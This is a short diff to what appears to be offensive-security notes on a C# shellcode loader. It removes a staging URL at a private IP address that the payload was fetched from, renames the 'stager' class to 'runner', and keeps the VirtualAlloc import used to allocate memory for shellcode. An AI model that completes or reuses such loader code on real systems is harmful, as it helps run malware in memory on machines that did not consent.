@@ -89,15 +89,12 @@ int main()
 #### CSharp
 ```csharp
 using System;
-using System.Net;
 using System.Runtime.InteropServices;
 
-namespace stager
+namespace runner
 {
-    public class stager
+    public class runner
     {
-        private static string url = "http://192.168.0.44/staging";
-
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
